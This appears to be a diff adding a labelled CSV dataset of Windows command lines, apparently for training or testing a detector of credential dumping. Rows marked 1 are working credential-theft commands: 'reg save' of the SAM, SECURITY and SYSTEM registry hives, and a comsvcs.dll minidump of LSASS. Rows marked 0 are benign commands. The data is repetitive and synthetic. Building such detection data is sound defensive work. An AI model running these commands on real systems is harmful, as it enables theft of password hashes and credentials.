+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
